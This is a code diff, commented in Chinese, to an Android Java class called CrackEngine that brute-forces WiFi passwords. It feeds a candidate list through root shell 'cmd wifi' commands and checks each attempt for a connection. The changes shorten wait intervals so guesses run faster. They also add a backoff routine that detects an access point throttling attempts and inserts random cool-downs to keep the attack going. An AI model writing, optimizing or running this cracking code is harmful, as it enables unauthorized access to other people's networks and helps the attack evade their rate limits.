@@ -397,24 +397,36 @@ public final class CrackEngine {
      */
     private boolean forgetTargetByShell(String ssid) {
         if (shell == null || ssid == null) return false;
-        for (int round = 0; round < 3; round++) {
+        // 两轮足够：第一轮删净即返回；第二轮兜「删了又被系统重建」的罕见情况。
+        // 原来每轮是「删一次 + sleep(400) + 下轮再查」，现在把「删 + 等 0.3s + 回读」
+        // 压进同一次 shell 调用 —— 省掉一次进程启动和一个固定 sleep。
+        for (int round = 0; round < 2; round++) {
             long leftover = -1;
             try {
                 String out = shell.exec("cmd wifi list-networks", 5000);
                 if (out == null) return false;
-                for (String line : out.split("\n")) {
-                    Long id = parseNetIdLine(line, ssid);
-                    if (id != null) { leftover = id; break; }
-                }
+                leftover = netIdIn(out, ssid);
             } catch (Throwable ignored) {
                 return false;
             }
             if (leftover < 0) return true;
-            try { shell.exec("cmd wifi forget-network " + leftover, 4000); }
-            catch (Throwable ignored) {}
-            sleep(400);
+            try {
+                String out2 = shell.exec("cmd wifi forget-network " + leftover
+                        + "; sleep 0.3; cmd wifi list-networks", 6000);
+                if (out2 != null && netIdIn(out2, ssid) < 0) return true;
+            } catch (Throwable ignored) {}
         }
         return netIdOfTarget(ssid) < 0;
+    }
+
+    /** 从 `cmd wifi list-networks` 输出里找目标的 netId；找不到返回 -1。 */
+    private long netIdIn(String out, String ssid) {
+        if (out == null || ssid == null) return -1;
+        for (String line : out.split("\n")) {
+            Long id = parseNetIdLine(line, ssid);
+            if (id != null) return id;
+        }
+        return -1;
     }
 
     /**
@@ -982,8 +994,17 @@ public final class CrackEngine {
 
         // 命令后目标会得到一个新 netId（配置已在此之前删净并回读确认）。
         // 用它和 status 里的 Net ID 比对，把「连上了目标」严格归因到这条候选。
-        sleep(400);
-        final long targetNetId = netIdOfTarget(target.ssid);
+        //
+        // 原来是固定 sleep(400) 再查一次：快机器上白等，慢机器上可能还没建好。
+        // 改成轮询 —— 最快 100ms 就能继续，最多等 600ms。
+        long netIdProbe = -1;
+        final long netIdWaitUntil = SystemClock.uptimeMillis() + 600;
+        while (SystemClock.uptimeMillis() < netIdWaitUntil) {
+            sleep(100);
+            netIdProbe = netIdOfTarget(target.ssid);
+            if (netIdProbe >= 0) break;
+        }
+        final long targetNetId = netIdProbe;
 
         android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                 + " pw=" + password.length() + " timeout=" + timeoutMs
@@ -1039,9 +1060,9 @@ public final class CrackEngine {
                 return new Attempt(password, Verdict.ABORTED,
                         SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
             }
-            // 200ms：status 本身要 ~100ms，合成每轮约 300ms。
-            // 再密只是空转 shell，再疏就拖慢失败识别。
-            sleep(200);
+            // 100ms：实测 `su -c cmd wifi status` 只要 18ms、一次 logcat 读约 20ms，
+            // 每轮真实成本不到 50ms —— 所以间隔可以比原来（200ms）密一倍。
+            sleep(100);
 
             String st = null;
             try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
@@ -1397,7 +1418,7 @@ public final class CrackEngine {
                 return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                         L.s("复验被取消", "verification cancelled"));
             }
-            sleep(300);
+            sleep(150);
 
             // 判据 A：状态机日志（root）
             if (logReadable) {
@@ -1614,6 +1635,8 @@ public final class CrackEngine {
         // WiFi 重置、基线断开、通道自检这些一次性开销，
         // 摊进「每条耗时」会让预估值被严重高估。
         long pureTryMs = 0L;
+        // AP 侧退避检测窗口（连续偏慢就冷却一下，别拿无效尝试硬怼）
+        final BackoffPolicy.Window backoff = new BackoffPolicy.Window();
 
         l.onLog(L.f("引擎点火：%s 通道 · 弹药 %d 发 · 单发时限 %.1f 秒",
                 "Engine: %s, %d candidates, up to %.1fs each",
@@ -1630,7 +1653,20 @@ public final class CrackEngine {
 
                 long itemT0 = SystemClock.uptimeMillis();
                 Attempt a = tryOne(target, security, c.password, perItem);
-                pureTryMs += SystemClock.uptimeMillis() - itemT0;
+                long itemMs = SystemClock.uptimeMillis() - itemT0;
+                pureTryMs += itemMs;
+
+                // 退避检测：连续几条都明显变慢，说明目标在限流；
+                // 按原节奏继续只会得到一串无效尝试，插一小段随机冷却更划算。
+                backoff.record(itemMs);
+                long cool = BackoffPolicy.suggestDelayMs(backoff.recent(), backoff.count());
+                if (cool > 0) {
+                    l.onLog(L.f("目标疑似限流（连续 %d 条偏慢），冷却 %.1f 秒",
+                            "target looks rate-limited (last %d slow), cooling %.1fs",
+                            BackoffPolicy.MIN_SAMPLES, cool / 1000.0));
+                    sleep(cool);
+                    backoff.reset();
+                }
 
                 // 命中即命中 —— 复验只作为**附加信息**，不再一票否决。
                 //
